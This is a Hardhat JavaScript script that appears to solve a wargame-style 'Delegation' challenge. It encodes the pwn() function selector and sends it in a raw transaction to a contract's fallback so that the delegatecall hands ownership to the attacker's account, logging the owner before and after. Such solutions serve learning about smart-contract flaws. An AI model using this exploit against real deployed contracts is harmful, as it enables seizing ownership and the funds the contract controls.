// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");

async function main() {
  // 👉 Contract name and address
  const contractName = "Delegation";
  const contractAddress = "0x0A1fBb76340d8d65870a77C828D62cCF9bf63FC9";

  // 📗 We get the contract to be hacked
  const contract = await hre.ethers.getContractAt(
    contractName,
    contractAddress
  );

  // 🔨 Get accounts
  const [deployerSigner, hackerSigner, testingSigner] =
    await hre.ethers.getSigners();
  console.log(`🤓 Hacker address:\n ${testingSigner.address} \n`);

  // 🗣 Get contract owner
  let owner = await contract.owner();
  console.log(`🔑 Initial delegation owner: ${owner}\n`);

  // 👿 Hacking the contract
  // 👿 Encoding the data for the delegatecall
  // 📖 https://github.com/ethers-io/ethers.js/issues/47
  // 📖 https://ethereum.stackexchange.com/questions/114146/how-do-i-manually-encode-and-send-transaction-data
  const pwnFunctionSelector = ethers.utils
    .keccak256(ethers.utils.toUtf8Bytes("pwn()"))
    .substring(0, 10);

  let dataEncoded = ethers.utils.solidityPack(
    ["bytes4"],
    [pwnFunctionSelector]
  );

  console.log("\n👿 Hacking . . .");
  console.log("👿 pwn() encoded data:", dataEncoded);

  // 📖 https://docs.ethers.io/v4/api-utils.html#solidity
  const fallbackDelegateWithInputCallHackedTx =
    await testingSigner.sendTransaction({
      to: contract.address,
      data: dataEncoded,
      gasLimit: 1000000, // 👈 Gas limit increased to avoid running out of gas
    });
  console.log(fallbackDelegateWithInputCallHackedTx);

  const result = await fallbackDelegateWithInputCallHackedTx.wait(
    (confirms = 1) // wait until the transaction is mined
  );
  console.log(result);

  // 🗣 Get contract owner
  owner = await contract.owner();
  console.log(`🔑 New delegation owner: ${owner}\n`);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
